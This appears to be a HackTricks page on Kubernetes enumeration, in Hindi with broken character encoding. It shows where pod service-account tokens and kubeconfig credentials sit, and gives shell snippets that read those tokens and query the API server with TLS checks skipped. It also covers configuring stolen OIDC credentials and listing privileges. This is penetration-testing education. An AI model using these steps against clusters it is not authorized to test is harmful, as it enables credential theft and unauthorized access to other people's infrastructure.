# Kubernetes рдЬрд╛рдБрдЪ

{% hint style="success" %}
AWS рд╣реИрдХрд┐рдВрдЧ рд╕реАрдЦреЗрдВ рдФрд░ рдЕрднреНрдпрд╛рд╕ рдХрд░реЗрдВ:<img src="/.gitbook/assets/image.png" alt="" data-size="line">[**HackTricks рдкреНрд░рд╢рд┐рдХреНрд╖рдг AWS рд░реЗрдб рдЯреАрдо рд╡рд┐рд╢реЗрд╖рдЬреНрдЮ (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/image.png" alt="" data-size="line">\
GCP рд╣реИрдХрд┐рдВрдЧ рд╕реАрдЦреЗрдВ рдФрд░ рдЕрднреНрдпрд╛рд╕ рдХрд░реЗрдВ: <img src="/.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks рдкреНрд░рд╢рд┐рдХреНрд╖рдг GCP рд░реЗрдб рдЯреАрдо рд╡рд┐рд╢реЗрд╖рдЬреНрдЮ (GRTE)**<img src="/.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>рд╣реИрдХрдЯреНрд░рд┐рдХреНрд╕ рдХрд╛ рд╕рдорд░реНрдерди рдХрд░реЗрдВ</summary>

* [**рд╕рджрд╕реНрдпрддрд╛ рдпреЛрдЬрдирд╛рдПрдБ**](https://github.com/sponsors/carlospolop) рдХреА рдЬрд╛рдБрдЪ рдХрд░реЗрдВ!
* **рд╢рд╛рдорд┐рд▓ рд╣реЛрдВ** ЁЯТм [**рдбрд┐рд╕реНрдХреЙрд░реНрдб рд╕рдореВрд╣**](https://discord.gg/hRep4RUj7f) рдпрд╛ [**рдЯреЗрд▓реАрдЧреНрд░рд╛рдо рд╕рдореВрд╣**](https://t.me/peass) рдпрд╛ рд╣рдореЗрдВ **рдЯреНрд╡рд┐рдЯрд░** ЁЯРж [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)** рдкрд░ рдлреЙрд▓реЛ** рдХрд░реЗрдВред
* **рд╣реИрдХрд┐рдВрдЧ рдЯреНрд░рд┐рдХреНрд╕ рд╕рд╛рдЭрд╛ рдХрд░реЗрдВ, рд╣реИрдХрдЯреНрд░рд┐рдХреНрд╕** рдФрд░ [**рд╣реИрдХрдЯреНрд░рд┐рдХреНрд╕ рдХреНрд▓рд╛рдЙрдб**](https://github.com/carlospolop/hacktricks-cloud) github рд░реЗрдкреЛ рдореЗрдВ PR рдЬрдорд╛ рдХрд░рдХреЗред

</details>
{% endhint %}

## Kubernetes рдЯреЛрдХрди

рдпрджрд┐ рдЖрдкрдХреЗ рдкрд╛рд╕ рдХрд┐рд╕реА рдорд╢реАрди рддрдХ рдкрд╣реБрдВрдЪрдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рд╣реИ рддреЛ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреЗ рдкрд╛рд╕ рдХреБрдЫ Kubernetes рдкреНрд▓реЗрдЯрдлреЙрд░реНрдо рддрдХ рдкрд╣реБрдВрдЪрдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рд╣реЛ рд╕рдХрддреА рд╣реИред рдЯреЛрдХрди рдЖрдо рддреМрд░ рдкрд░ **env var `KUBECONFIG`** рджреНрд╡рд╛рд░рд╛ рд╕реВрдЪрд┐рдд рдПрдХ рдлрд╝рд╛рдЗрд▓ рдореЗрдВ рд╕реНрдерд┐рдд рд╣реЛрддрд╛ рд╣реИ рдпрд╛ **`~/.kube`** рдХреЗ рдЕрдВрджрд░ред

рдЗрд╕ рдлрд╝реЛрд▓реНрдбрд░ рдореЗрдВ рдЖрдкрдХреЛ **рдПрдкреАрдЖрдИ рд╕рд░реНрд╡рд░ рд╕реЗ рдХрдиреЗрдХреНрдЯ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдЯреЛрдХрди рдФрд░ рдХреЙрдиреНрдлрд╝рд┐рдЧрд░реЗрд╢рди** рд╡рд╛рд▓реА рдХреЙрдиреНрдлрд╝рд┐рдЧ рдлрд╝рд╛рдЗрд▓реЗрдВ рдорд┐рд▓ рд╕рдХрддреА рд╣реИрдВред рдЗрд╕ рдлрд╝реЛрд▓реНрдбрд░ рдореЗрдВ рдЖрдк рдкрд╣рд▓реЗ рд╕реЗ рдкреНрд░рд╛рдкреНрдд рдЬрд╛рдирдХрд╛рд░реА рд╡рд╛рд▓реЗ рдПрдХ рдХреИрд╢ рдлрд╝реЛрд▓реНрдбрд░ рднреА рдкрд╛ рд╕рдХрддреЗ рд╣реИрдВред

рдпрджрд┐ рдЖрдк Kubernetes рдкрд░рд┐рд╡реЗрд╢ рдХреЗ рднреАрддрд░ рдХрд┐рд╕реА рдкреЙрдб рдХреЛ рдХрдВрдкреНрд░реЛрдорд╛рдЗрдЬрд╝ рдХрд░ рд▓рд┐рдпрд╛ рд╣реИ, рддреЛ рд╡рд╣рд╛рдБ рдЕрдиреНрдп рд╕реНрдерд╛рди рд╣реИрдВ рдЬрд╣рд╛рдБ рдЖрдк рдЯреЛрдХрди рдФрд░ рд╡рд░реНрддрдорд╛рди K8 рдПрдирд╡реА рдХреЗ рдмрд╛рд░реЗ рдореЗрдВ рдЬрд╛рдирдХрд╛рд░реА рдкрд╛ рд╕рдХрддреЗ рд╣реИрдВ:

### рд╕реЗрд╡рд╛ рдЕрдХрд╛рдЙрдВрдЯ рдЯреЛрдХрди

рдЬрд╛рд░реА рд░рдЦрдиреЗ рд╕реЗ рдкрд╣рд▓реЗ, рдпрджрд┐ рдЖрдкрдХреЛ рдкрддрд╛ рдирд╣реАрдВ рд╣реИ рдХрд┐ Kubernetes рдореЗрдВ рд╕реЗрд╡рд╛ рдХреНрдпрд╛ рд╣реИ, рддреЛ рдореИрдВ рдЖрдкрдХреЛ **рдЗрд╕ рд▓рд┐рдВрдХ рдХрд╛ рдкрд╛рд▓рди рдХрд░рдиреЗ рдФрд░ рдХрдо рд╕реЗ рдХрдо Kubernetes рд╡рд╛рд╕реНрддреБрдХрд▓рд╛ рдХреЗ рдмрд╛рд░реЗ рдореЗрдВ рдЬрд╛рдирдХрд╛рд░реА рдкрдврд╝рдиреЗ рдХреА рд╕рд▓рд╛рд╣ рджреВрдВрдЧрд╛ред**

Kubernetes [рджрд╕реНрддрд╛рд╡реЗрдЬрд╝реАрдХрд░рдг](https://kubernetes.io/docs/tasks/configure-pod-container/configure-service-account/#use-the-default-service-account-to-access-the-api-server) рд╕реЗ рд▓рд┐рдпрд╛ рдЧрдпрд╛:

_тАЬрдЬрдм рдЖрдк рдПрдХ рдкреЙрдб рдмрдирд╛рддреЗ рд╣реИрдВ, рдЕрдЧрд░ рдЖрдк рдХрд┐рд╕реА рд╕реЗрд╡рд╛ рдЦрд╛рддрд╛ рдХреЛ рдирд┐рд░реНрджрд┐рд╖реНрдЯ рдирд╣реАрдВ рдХрд░рддреЗ рд╣реИрдВ, рддреЛ рдЙрд╕реЗ рд╕реНрд╡рдЪрд╛рд▓рд┐рдд рд░реВрдк рд╕реЗ_ рдбрд┐рдлрд╝реЙрд▓реНрдЯ _рд╕реЗрд╡рд╛ рдЦрд╛рддрд╛ рдирд╛рдорд┐рдд рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ рдЬреЛ рдЙрд╕реА рдиреЗрдорд╕реНрдкреЗрд╕ рдореЗрдВ рд╣реИредтАЭ_

**рд╕реЗрд╡рд╛ рдЦрд╛рддрд╛** рдПрдХ рдСрдмреНрдЬреЗрдХреНрдЯ рд╣реИ рдЬрд┐рд╕реЗ Kubernetes рджреНрд╡рд╛рд░рд╛ рдкреНрд░рдмрдВрдзрд┐рдд рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ рдФрд░ рдЬреЛ рдкреЙрдб рдореЗрдВ рдЪрд▓рдиреЗ рд╡рд╛рд▓реЗ рдкреНрд░рдХреНрд░рд┐рдпрд╛рдУрдВ рдХреЗ рд▓рд┐рдП рдкрд╣рдЪрд╛рди рдкреНрд░рджрд╛рди рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдЙрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИред\
рдкреНрд░рддреНрдпреЗрдХ рд╕реЗрд╡рд╛ рдЦрд╛рддреЗ рдХреЗ рд╕рд╛рде рдПрдХ рдЧреБрдкреНрдд рд╕рдВрдмрдВрдзрд┐рдд рд╣реЛрддрд╛ рд╣реИ рдФрд░ рдпрд╣ рд╕реАрдХреНрд░реЗрдЯ рдПрдХ рдмрд┐рдпрд░рд░ рдЯреЛрдХрди рд╢рд╛рдорд┐рд▓ рдХрд░рддрд╛ рд╣реИред рдпрд╣ рдПрдХ JSON рд╡реЗрдм рдЯреЛрдХрди (JWT) рд╣реИ, рджреЛ рдкрдХреНрд╖реЛрдВ рдХреЗ рдмреАрдЪ рд╕реБрд░рдХреНрд╖рд┐рдд рд░реВрдк рд╕реЗ рджрд╛рд╡реЗ рдХреЛ рдкреНрд░рддрд┐рдирд┐рдзрд┐рддреНрд╡ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдПрдХ рд╡рд┐рдзрд┐ред

рд╕рд╛рдорд╛рдиреНрдпрдд: **рдПрдХ** рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рдирд┐рд░реНрджреЗрд╢рд┐рдХрд╛рдУрдВ рдореЗрдВ:

* `/run/secrets/kubernetes.io/serviceaccount`
* `/var/run/secrets/kubernetes.io/serviceaccount`
* `/secrets/kubernetes.io/serviceaccount`

рдлрд╝рд╛рдЗрд▓реЗрдВ рд╢рд╛рдорд┐рд▓ рд╣реЛрддреА рд╣реИрдВ:

* **ca.crt**: рдпрд╣ рдХреБрдмрд░рдиреЗрдЯреНрд╕ рд╕рдВрдЪрд╛рд░ рдХреА рдЬрд╛рдВрдЪ рдХреЗ рд▓рд┐рдП ca рдкреНрд░рдорд╛рдгрдкрддреНрд░ рд╣реИ
* **рдиреЗрдорд╕реНрдкреЗрд╕**: рдпрд╣ рд╡рд░реНрддрдорд╛рди рдиреЗрдорд╕реНрдкреЗрд╕ рдХреЛ рджрд░реНрд╢рд╛рддрд╛ рд╣реИ
* **рдЯреЛрдХрди**: рдпрд╣ рд╡рд░реНрддрдорд╛рди рдкреЙрдб рдХрд╛ **рд╕реЗрд╡рд╛ рдЯреЛрдХрди** рд╢рд╛рдорд┐рд▓ рдХрд░рддрд╛ рд╣реИред

рдЕрдм рдЬрдм рдЖрдкрдХреЗ рдкрд╛рд╕ рдЯреЛрдХрди рд╣реИ, рддреЛ рдЖрдк рдПрдирд╡рд╛рдпрд░рдореЗрдВрдЯ рд╡реЗрд░рд┐рдПрдмрд▓ **`KUBECONFIG`** рдХреЗ рдЕрдВрджрд░ API рд╕рд░реНрд╡рд░ рдЦреЛрдЬ рд╕рдХрддреЗ рд╣реИрдВред рдЕрдзрд┐рдХ рдЬрд╛рдирдХрд╛рд░реА рдХреЗ рд▓рд┐рдП `(env | set) | grep -i "kuber|kube`**`"`** рдЪрд▓рд╛рдПрдВ

рд╕реЗрд╡рд╛ рдЦрд╛рддрд╛ рдЯреЛрдХрди **sa.key** рдореЗрдВ рд░рд╣рдиреЗ рд╡рд╛рд▓реА рдХреБрдВрдЬреА рджреНрд╡рд╛рд░рд╛ рд╣рд╕реНрддрд╛рдХреНрд╖рд░рд┐рдд рдХрд┐рдпрд╛ рдЬрд╛ рд░рд╣рд╛ рд╣реИ рдФрд░ **sa.pub** рджреНрд╡рд╛рд░рд╛ рдорд╛рдиреНрдпрддрд╛ рдкреНрд░рд╛рдкреНрдд рдХрд┐рдпрд╛ рдЬрд╛ рд░рд╣рд╛ рд╣реИред

**Kubernetes** рдкрд░ рдбрд┐рдлрд╝реЙрд▓реНрдЯ рд╕реНрдерд╛рди:

* /etc/kubernetes/pki

**Minikube** рдкрд░ рдбрд┐рдлрд╝реЙрд▓реНрдЯ рд╕реНрдерд╛рди:

* /var/lib/localkube/certs

### рд╣реЙрдЯ рдкреЙрдбреНрд╕

_**рд╣реЙрдЯ рдкреЙрдбреНрд╕**_ рдЙрдЪреНрдЪрд╛рдзрд┐рдХрд╛рд░рд┐рдХ рд╕реЗрд╡рд╛ рдЦрд╛рддрд╛ рдЯреЛрдХрди рд╡рд╛рд▓реЗ рдкреЙрдб рд╣реЛрддреЗ рд╣реИрдВред рдЙрдЪреНрдЪрд╛рдзрд┐рдХрд╛рд░рд┐рдХ рд╕реЗрд╡рд╛ рдЦрд╛рддрд╛ рдЯреЛрдХрди рдПрдХ рдЯреЛрдХрди рд╣реИ рдЬрд┐рд╕рдХрд╛ рдЕрдиреБрдорддрд┐ рд╣реИ рдХрд┐ рдЧреЛрдкрдиреАрдп рдХрд╛рд░реНрдпреЛрдВ рдЬреИрд╕реЗ рд░рд╣рд╕реНрдпреЛрдВ рдХреА рд╕реВрдЪреА, рдкреЙрдб рдмрдирд╛рдирд╛, рдЖрджрд┐ рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рд╣реИред

## RBAC

рдпрджрд┐ рдЖрдк рдирд╣реАрдВ рдЬрд╛рдирддреЗ рдХрд┐ **RBAC** рдХреНрдпрд╛ рд╣реИ, **рдЗрд╕ рдЦрдВрдб рдХреЛ рдкрдврд╝реЗрдВ**ред

## рдЬрд╛рдБрдЪ рдЪреАрдЯрд╢реАрдЯ

K8s рдкрд░рд┐рд╡реЗрд╢ рдХреА рдЬрд╛рдБрдЪ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдЖрдкрдХреЛ рдЗрдирдореЗрдВ рд╕реЗ рдХреБрдЫ рдЪрд╛рд╣рд┐рдП:

* **рдПрдХ **рдорд╛рдиреНрдп рдкреНрд░рдорд╛рдгреАрдХрд░рдг рдЯреЛрдХрди**ред рдкрд┐рдЫрд▓реЗ рдЦрдВрдб рдореЗрдВ рд╣рдордиреЗ рджреЗрдЦрд╛ рдХрд┐ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдЯреЛрдХрди рдФрд░ рд╕реЗрд╡рд╛ рдЦрд╛рддрд╛ рдЯреЛрдХрди рдХреА рдЦреЛрдЬ рдХрд╣рд╛рдБ рдХрд░рдиреА рд╣реИред
* **рдХреБрдмрд░рдиреЗрдЯреНрд╕ рдПрдкреАрдЖрдИ рдХрд╛ рдкрддрд╛ (**_**https://host:port**_**)**ред рдпрд╣ рдЖрдорддреМрд░ рдкрд░ рдПрдирд╡рд╛рдпрд░рдореЗрдВрдЯ рд╡реЗрд░рд┐рдПрдмрд▓реНрд╕ рдФрд░/рдпрд╛ kube рдХреЙрдиреНрдлрд╝рд┐рдЧ рдлрд╝рд╛рдЗрд▓ рдореЗрдВ рдкрд╛рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИред
* **рд╡реИрдХрд▓реНрдкрд┐рдХ**: **API рд╕рд░реНрд╡рд░ рдХреА рд╕рддреНрдпрд╛рдкрди рдХреЗ рд▓рд┐рдП ca.crt**ред рдпрд╣ рдЯреЛрдХрди рдХреЗ рдорд┐рд▓рдиреЗ рд╡рд╛рд▓реА рдЬрдЧрд╣реЛрдВ рдореЗрдВ рдкрд╛рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИред рдпрд╣ API рд╕рд░реНрд╡рд░ рдкреНрд░рдорд╛рдгрдкрддреНрд░ рдХреА рд╕рддреНрдпрд╛рдкрди рдХреЗ рд▓рд┐рдП рдЙрдкрдпреЛрдЧреА рд╣реИ, рд▓реЗрдХрд┐рди `kubectl` рдХреЗ рд╕рд╛рде `--insecure-skip-tls-verify` рдпрд╛ `curl` рдХреЗ рд╕рд╛рде `-k` рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдЖрдкрдХреЛ рдЗрд╕рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рдирд╣реАрдВ рд╣реЛрдЧреАред

рдЗрди рд╡рд┐рд╡рд░рдгреЛрдВ рдХреЗ рд╕рд╛рде рдЖрдк **рдХреБрдмрд░рдиреЗрдЯреНрд╕ рдХреА рдЬрд╛рдБрдЪ** рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред рдпрджрд┐ рдХрд┐рд╕реА рдХрд╛рд░рдг рд╕реЗ **рдЗрдВрдЯрд░рдиреЗрдЯ** рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ **API** рдЙрдкрд▓рдмреНрдз рд╣реИ, рддреЛ рдЖрдк рдмрд╕ рдЙрд╕ рдЬрд╛рдирдХрд╛рд░реА рдХреЛ рдбрд╛рдЙрдирд▓реЛрдб рдХрд░рдХреЗ рдЕрдкрдиреЗ рд╣реЛрд╕реНрдЯ рд╕реЗ рдкреНрд▓реЗрдЯрдлрд╝реЙрд░реНрдо рдХреА рдЬрд╛рдБрдЪ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред

рд╣рд╛рд▓рд╛рдВрдХрд┐, рдЖрдорддреМрд░ рдкрд░ **API рд╕рд░реНрд╡рд░ рдПрдХ рдЖрдВрддрд░рд┐рдХ рдиреЗрдЯрд╡рд░реНрдХ рдХреЗ рдЕрдВрджрд░ рд╣реЛрддрд╛ рд╣реИ**, рдЗрд╕рд▓рд┐рдП рдЖрдкрдХреЛ рдЗрд╕ рддрдХ рдкрд╣реБрдВрдЪрдиреЗ рдХреЗ рд▓рд┐рдП рдЕрдкрдиреА рдорд╢реАрди рд╕реЗ рдЙрд╕ рддрдХ рдкрд╣реБрдВрдЪрдиреЗ рдХреЗ рд▓рд┐рдП рдХрдВрдкреНрд░реЛрдорд╛рдЗрдЬрд╝ рдорд╢реАрди рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рдПрдХ рд╕реБрд░рдВрдЧ рдмрдирд╛рдиреЗ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реЛрдЧреА, рдпрд╛ рдЖрдк **[kubectl](https://kubernetes.io/docs/tasks/tools/install-kubectl-linux/#install-kubectl-binary-with-curl-on-linux)** рдмрд╛рдЗрдирд░реА рдЕрдкрд▓реЛрдб рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ, рдпрд╛ `curl/wget/anything` рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ API рд╕рд░реНрд╡рд░ рдХреЛ рд╕реАрдзреЗ HTTP рдЕрдиреБрд░реЛрдз рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред

### `list` рдФрд░ `get` рдХреНрд░рд┐рдпрд╛рдУрдВ рдХреЗ рдмреАрдЪ рдЕрдВрддрд░

**`get`** рдЕрдиреБрдорддрд┐рдпреЛрдВ рдХреЗ рд╕рд╛рде рдЖрдк рд╡рд┐рд╢реЗрд╖ рдЖрд╕реНрддрд┐рдпреЛрдВ рдХреА рдЬрд╛рдирдХрд╛рд░реА рддрдХ рдкрд╣реБрдВрдЪ рд╕рдХрддреЗ рд╣реИрдВ (_`kubectl` рдореЗрдВ `describe` рд╡рд┐рдХрд▓реНрдк_) API:
```
GET /apis/apps/v1/namespaces/{namespace}/deployments/{name}
```
рдпрджрд┐ рдЖрдкрдХреЗ рдкрд╛рд╕ **`list`** рдЕрдиреБрдорддрд┐ рд╣реИ, рддреЛ рдЖрдкрдХреЛ рдПрдХ рдкреНрд░рдХрд╛рд░ рдХреА рд╕рдВрдкрддреНрддрд┐ рдХреА рд╕реВрдЪреА рдмрдирд╛рдиреЗ рдХреЗ рд▓рд┐рдП API рдЕрдиреБрд░реЛрдз рдХреЛ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рд╣реИ (_`kubectl`_ рдореЗрдВ `get` рд╡рд┐рдХрд▓реНрдк):
```bash
#In a namespace
GET /apis/apps/v1/namespaces/{namespace}/deployments
#In all namespaces
GET /apis/apps/v1/deployments
```
рдпрджрд┐ рдЖрдкрдХреЗ рдкрд╛рд╕ **`watch`** рдЕрдиреБрдорддрд┐ рд╣реИ, рддреЛ рдЖрдкрдХреЛ рдПрдкреАрдЖрдИ рдЕрдиреБрд░реЛрдзреЛрдВ рдХреЛ рдирд┐рд╖реНрдХреНрд░рд┐рдп рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рд╣реИ:
```
GET /apis/apps/v1/deployments?watch=true
GET /apis/apps/v1/watch/namespaces/{namespace}/deployments?watch=true
GET /apis/apps/v1/watch/namespaces/{namespace}/deployments/{name}  [DEPRECATED]
GET /apis/apps/v1/watch/namespaces/{namespace}/deployments  [DEPRECATED]
GET /apis/apps/v1/watch/deployments  [DEPRECATED]
```
рд╡реЗ рдПрдХ рд╕реНрдЯреНрд░реАрдорд┐рдВрдЧ рдХрдиреЗрдХреНрд╢рди рдЦреЛрд▓рддреЗ рд╣реИрдВ рдЬреЛ рдЖрдкрдХреЛ рдПрдХ рдбрд┐рдкреНрд▓реЙрдпрдореЗрдВрдЯ рдХреЗ рдкреВрд░реНрдг рдореИрдирд┐рдлреЗрд╕реНрдЯ рдХреЛ рд╡рд╛рдкрд╕ рджреЗрддрд╛ рд╣реИ рдЬрдм рднреА рдпрд╣ рдмрджрд▓рддрд╛ рд╣реИ (рдпрд╛ рдЬрдм рдПрдХ рдирдпрд╛ рдмрдирд╛рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ)ред

{% hint style="danger" %}
рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд `kubectl` рдХрдорд╛рдВрдбреНрд╕ рдХреЗрд╡рд▓ рдпрд╣ рджрд┐рдЦрд╛рддреЗ рд╣реИрдВ рдХрд┐ рд╡рд╕реНрддреБрдУрдВ рдХреА рд╕реВрдЪреА рдХреИрд╕реЗ рдмрдирд╛рдИ рдЬрд╛рдПред рдпрджрд┐ рдЖрдк рдбреЗрдЯрд╛ рддрдХ рдкрд╣реБрдВрдЪрдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ рддреЛ `get` рдХреА рдмрдЬрд╛рдп `describe` рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдирд╛ рд╣реЛрдЧрд╛ред
{% endhint %}

### рдХрд░реНрд▓ рдХрд╛ рдЙрдкрдпреЛрдЧ

рдПрдХ рдкреЙрдб рдХреЗ рдЕрдВрджрд░ рд╕реЗ рдЖрдк рдХрдИ env variables рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ:
```bash
export APISERVER=${KUBERNETES_SERVICE_HOST}:${KUBERNETES_SERVICE_PORT_HTTPS}
export SERVICEACCOUNT=/var/run/secrets/kubernetes.io/serviceaccount
export NAMESPACE=$(cat ${SERVICEACCOUNT}/namespace)
export TOKEN=$(cat ${SERVICEACCOUNT}/token)
export CACERT=${SERVICEACCOUNT}/ca.crt
alias kurl="curl --cacert ${CACERT} --header \"Authorization: Bearer ${TOKEN}\""
# if kurl is still got cert Error, using -k option to solve this.
```
{% hint style="warning" %}
рдбрд┐рдлрд╝реЙрд▓реНрдЯ рд░реВрдк рд╕реЗ рдкреЙрдб **рдХреНрдпреВрдм-рдПрдкреАрдЖрдИ рд╕рд░реНрд╡рд░** рддрдХ **рдкрд╣реБрдВрдЪ** рдХрд░ рд╕рдХрддрд╛ рд╣реИ рдбреЛрдореЗрди рдирд╛рдо **`kubernetes.default.svc`** рдФрд░ рдЖрдк **`/etc/resolv.config`** рдореЗрдВ рдХреНрдпреВрдм рдиреЗрдЯрд╡рд░реНрдХ рджреЗрдЦ рд╕рдХрддреЗ рд╣реИрдВ рдпрд╣рд╛рдБ рдЖрдкрдХреЛ рдХреНрдпреВрдмрд░реНрдиреЗрдЯреАрдЬрд╝ DNS рд╕рд░реНрд╡рд░ рдХрд╛ рдкрддрд╛ рдорд┐рд▓реЗрдЧрд╛ (рдПрдХ рд╣реА рд╕реАрдорд╛ рдХрд╛ ".1" рдХреНрдпреВрдм-рдПрдкреАрдЖрдИ рдПрдВрдбрдкреЙрдЗрдВрдЯ рд╣реИ)ред
{% endhint %}

### рдХреБрдмреЗрдХреНрдЯрд▓ рдХрд╛ рдЙрдкрдпреЛрдЧ

рдЯреЛрдХрди рдФрд░ рдПрдкреАрдЖрдИ рд╕рд░реНрд╡рд░ рдХрд╛ рдкрддрд╛ рд╣реЛрдиреЗ рдкрд░ рдЖрдк рдЗрд╕реЗ рдпрд╣рд╛рдБ рджрд┐рдЦрд╛рдпрд╛ рдЧрдпрд╛ рддрд░реАрдХреЗ рд╕реЗ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдХреБрдмреЗрдХреНрдЯрд▓ рдпрд╛ рдХрд░реНрд▓ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ:

рдбрд┐рдлрд╝реЙрд▓реНрдЯ рд░реВрдк рд╕реЗ, рдПрдкреАрд╕рд░реНрд╡рд░ `https://` рд╕реНрдХреАрдо рдХреЗ рд╕рд╛рде рд╕рдВрдЪрд╛рд░ рдХрд░ рд░рд╣рд╛ рд╣реИ
```bash
alias k='kubectl --token=$TOKEN --server=https://$APISERVER --insecure-skip-tls-verify=true'
```
> рдпрджрд┐ URL рдореЗрдВ `https://` рдирд╣реАрдВ рд╣реИ, рддреЛ рдЖрдкрдХреЛ рдмреИрдб рд░рд┐рдХреНрд╡реЗрд╕реНрдЯ рдЬреИрд╕реА рддреНрд░реБрдЯрд┐ рдорд┐рд▓ рд╕рдХрддреА рд╣реИред

рдЖрдк рдпрд╣рд╛рдБ [**рдЖрдзрд┐рдХрд╛рд░рд┐рдХ kubectl рдЪреАрдЯрд╢реАрдЯ**](https://kubernetes.io/docs/reference/kubectl/cheatsheet/) рдкрд╛ рд╕рдХрддреЗ рд╣реИрдВред рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рдЦрдВрдбреЛрдВ рдХрд╛ рдЙрджреНрджреЗрд╢реНрдп рдЖрдкрдХреЛ рдкрд╣реБрдВрдЪреЗ рдирдП K8s рдХреЛ рдЬрд╛рдВрдЪрдиреЗ рдФрд░ рд╕рдордЭрдиреЗ рдХреЗ рд╡рд┐рднрд┐рдиреНрди рд╡рд┐рдХрд▓реНрдкреЛрдВ рдХреЛ рдХреНрд░рдордмрджреНрдз рд░реВрдк рд╕реЗ рдкреНрд░рд╕реНрддреБрдд рдХрд░рдирд╛ рд╣реИред

`kubectl` рджреНрд╡рд╛рд░рд╛ рднреЗрдЬреЗ рдЧрдП HTTP рдЕрдиреБрд░реЛрдз рдХреЛ рдЦреЛрдЬрдиреЗ рдХреЗ рд▓рд┐рдП рдЖрдк рдкреИрд░рд╛рдореАрдЯрд░ `-v=8` рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред

#### MitM kubectl - kubectl рдХреЛ рдкреНрд░реЙрдХреНрд╕реАрдлрд╛рдИ рдХрд░рдирд╛
```bash
# Launch burp
# Set proxy
export HTTP_PROXY=http://localhost:8080
export HTTPS_PROXY=http://localhost:8080
# Launch kubectl
kubectl get namespace --insecure-skip-tls-verify=true
```
### рд╡рд░реНрддрдорд╛рди рдХреЙрдиреНрдлрд╝рд┐рдЧрд░реЗрд╢рди

{% tabs %}
{% tab title="Kubectl" %}
```bash
kubectl config get-users
kubectl config get-contexts
kubectl config get-clusters
kubectl config current-context

# Change namespace
kubectl config set-context --current --namespace=<namespace>
```
{% endtab %}
{% endtabs %}

рдпрджрд┐ рдЖрдкрдиреЗ рдХреБрдЫ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреНрд░реЗрдбреЗрдВрд╢рд┐рдпрд▓реНрд╕ рдЪреБрд░рд╛ рд▓рд┐рдП рд╣реИрдВ рддреЛ рдЖрдк **рдЙрдиреНрд╣реЗрдВ рд╕реНрдерд╛рдиреАрдп рд░реВрдк рд╕реЗ рдХреЙрдиреНрдлрд╝рд┐рдЧрд░** рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рдХреБрдЫ рдЗрд╕ рдкреНрд░рдХрд╛рд░:
```bash
kubectl config set-credentials USER_NAME \
--auth-provider=oidc \
--auth-provider-arg=idp-issuer-url=( issuer url ) \
--auth-provider-arg=client-id=( your client id ) \
--auth-provider-arg=client-secret=( your client secret ) \
--auth-provider-arg=refresh-token=( your refresh token ) \
--auth-provider-arg=idp-certificate-authority=( path to your ca certificate ) \
--auth-provider-arg=id-token=( your id_token )
```
### рдкреНрд░рд╛рдпреЛрдЬрд┐рдд рд╕рдВрд╕рд╛рдзрди рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ

рдЗрд╕ рдЬрд╛рдирдХрд╛рд░реА рдХреЗ рд╕рд╛рде рдЖрдкрдХреЛ рд╕рднреА рд╕реЗрд╡рд╛рдПрдВ рдкрддрд╛ рдЪрд▓ рдЬрд╛рдПрдВрдЧреА рдЬрд┐рдиреНрд╣реЗрдВ рдЖрдк рд╕реВрдЪреАрдмрджреНрдз рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ

{% tabs %}
{% tab title="kubectl" %}
```bash
k api-resources --namespaced=true #Resources specific to a namespace
k api-resources --namespaced=false #Resources NOT specific to a namespace
```
### рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ рд╡рд░реНрддрдорд╛рди рд╡рд┐рд╢реЗрд╖рд╛рдзрд┐рдХрд╛рд░

{% tabs %}
{% tab title="kubectl" %}
```bash
k auth can-i --list #Get privileges in general
k auth can-i --list -n custnamespace #Get privileves in custnamespace

# Get service account permissions
k auth can-i --list --as=system:serviceaccount:<namespace>:<sa_name> -n <namespace>
```
{% endtab %}

